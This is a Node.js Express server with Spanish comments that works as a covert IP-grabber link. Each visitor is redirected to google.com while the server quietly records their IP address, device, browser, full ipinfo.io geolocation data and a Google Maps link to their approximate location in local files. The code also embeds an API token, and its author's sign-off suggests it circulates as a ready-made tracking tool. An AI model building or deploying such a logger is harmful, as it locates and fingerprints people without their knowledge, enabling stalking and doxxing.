import express from 'express';
import fs from 'fs';
import { DateTime } from 'luxon';
import fetch from 'node-fetch';
import useragent from 'useragent'; // Importar el módulo useragent

const app = express();
const PORT = 3000;

// Función para validar una dirección IP
function validateIP(ip) {
    // Expresión regular para validar una dirección IP
    const ipRegex = /^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/;
    return ipRegex.test(ip);
}

// Middleware para obtener los datos de geolocalización y redirigir a google.com
app.get('/', async (req, res) => {
    const ipList = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    const userAgentString = req.headers['user-agent']; // Obteniendo el agente de usuario (user agent) del cliente

    // Analizar el agente de usuario para obtener información del dispositivo y navegador
    const userAgent = useragent.parse(userAgentString);
    const deviceInfo = `${userAgent.device.family} ${userAgent.os.toString()}`; // Nombre y modelo del dispositivo
    const browserInfo = `${userAgent.family} ${userAgent.major}`; // Navegador y su versión

    // Dividir la lista de direcciones IP y encontrar la primera dirección IP válida
    let ip;
    if (ipList.includes(',')) {
        const ips = ipList.split(',');
        for (let i = 0; i < ips.length; i++) {
            if (validateIP(ips[i].trim())) {
                ip = ips[i].trim();
                break;
            }
        }
    } else {
        ip = ipList;
    }

    // Validar la dirección IP antes de hacer la solicitud
    if (!validateIP(ip)) {
        res.status(400).json({ error: 'Dirección IP no válida' });
        return;
    }

    // Obtener información de geolocalización basada en la dirección IP
    const response = await fetch(`https://ipinfo.io/${ip}?token=06d13380841403`);
    const jsonData = await response.json();

    // Generar el enlace de Google Maps con las coordenadas de latitud y longitud
    const coordinates = jsonData.loc.split(',');
    const googleMapsLink = `https://www.google.com/maps?q=${coordinates[0]},${coordinates[1]}`;

    // Redirigir a google.com
    res.redirect('http://google.com');

    // Generar el nombre del archivo basado en la fecha, hora y minuto actual
    const now = DateTime.now().toFormat('yyyy LL dd HH mm');
    const filename = `ips/${now}.txt`;

    // Construir el mensaje de registro y el contenido del archivo de texto
    let logMessage = 'Datos guardados correctamente.\n';
    let fileContent = `IP: ${ip}\n`;

    // Agregar información del dispositivo y navegador a los datos registrados
    logMessage += `Dispositivo: ${deviceInfo}\n`;
    fileContent += `Dispositivo: ${deviceInfo}\n`;
    logMessage += `Navegador: ${browserInfo}\n`;
    fileContent += `Navegador: ${browserInfo}\n`;

    // Agregar el enlace de Google Maps a los datos de geolocalización
    logMessage += `Google Maps: ${googleMapsLink}\n`;
    fileContent += `Google Maps: ${googleMapsLink}\n`;

    // Agregar todos los datos adicionales proporcionados por el servicio de geolocalización
    Object.keys(jsonData).forEach(key => {
        logMessage += `${key}: ${jsonData[key]}\n`;
        fileContent += `${key}: ${jsonData[key]}\n`;
    });

    fs.writeFile(filename, fileContent, (err) => {
        if (err) {
            console.error(err);
        } else {
            console.log(logMessage);
        }
    });
});

app.listen(PORT, () => {
    console.log(`Servidor escuchando en el puerto ${PORT}`);
});

//don't skid this, MR Mecha
